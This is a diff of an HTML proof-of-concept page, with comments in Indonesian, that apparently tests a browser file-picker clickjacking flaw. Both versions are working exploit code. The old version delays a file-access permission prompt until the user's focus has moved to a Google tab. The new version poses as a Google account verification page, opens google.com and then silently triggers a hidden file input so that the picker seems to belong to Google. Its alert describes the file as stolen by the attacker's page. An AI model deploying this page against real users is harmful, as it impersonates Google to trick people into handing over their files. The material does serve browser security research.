@@ -1,49 +1,58 @@
-<body align="center" onclick="load()" style="color: red; font-size: 24px">
-  Click Here to Start Test
-
-  <script>
-    async function load() {
-      // 1. Pemicu awal File Picker
-      const pickerPromise = window.showOpenFilePicker();
-
-      // 2. Segera buka tab Google agar pengguna berpindah fokus
-      window.open("https://google.com", "_blank");
-
-      // 3. Tambahkan jeda (misal: 10 detik) sebelum memproses file yang dipilih
-      // Ini memberikan waktu bagi pengguna untuk berinteraksi di tab Google
-      console.log("Menunggu 10 detik di latar belakang...");
-
-      setTimeout(async () => {
-        try {
-          const handles = await pickerPromise;
-          window.handle = handles[0];
-
-          // Meminta izin (Permission Request) setelah jeda lama
-          // Ini akan menguji apakah UI Chrome menunjukkan origin yang benar
-          // atau membuat user bingung karena muncul setelah mereka di tab Google.
-          await window.handle.requestPermission({ mode: "readwrite" });
-
-          previewImage();
-        } catch (err) {
-          console.log("User membatalkan atau terjadi error: ", err);
-        }
-      }, 5000); // 10000ms = 10 detik
-    }
-
-    async function previewImage() {
-      const file = await window.handle.getFile();
-      if (file.type.startsWith("image/")) {
-        const reader = new FileReader();
-        reader.onload = function (event) {
-          const imgElement = document.createElement("img");
-          imgElement.src = event.target.result;
-          imgElement.style.maxWidth = "500px";
-          document.body.appendChild(imgElement);
-        };
-        reader.readAsDataURL(file);
-      } else {
-        alert("File berhasil diakses, tapi bukan gambar.");
+<!doctype html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <title>PoC Clickjacking File Picker</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        text-align: center;
+        padding-top: 50px;
       }
-    }
-  </script>
-</body>
+      .btn {
+        padding: 15px 25px;
+        font-size: 18px;
+        cursor: pointer;
+        background: #4285f4;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        text-decoration: none;
+      }
+      #fileInput {
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Verifikasi Akun Google Anda</h1>
+    <p>Klik tombol di bawah untuk mengunggah foto profil langsung ke Google.</p>
+
+    <input
+      type="file"
+      id="fileInput"
+      onchange="alert('File berhasil dicuri oleh halaman penyerang!')"
+    />
+
+    <a
+      href="https://www.google.com"
+      target="_blank"
+      class="btn"
+      id="exploitBtn"
+    >
+      Klik untuk Upload ke Google
+    </a>
+
+    <script>
+      document
+        .getElementById("exploitBtn")
+        .addEventListener("click", function () {
+          // Memicu file picker di tab lama (halaman ini)
+          // saat browser sedang membuka tab baru.
+          setTimeout(function () {
+            document.getElementById("fileInput").click();
+          }, 100);
+        });
+    </script>
+  </body>
+</html>
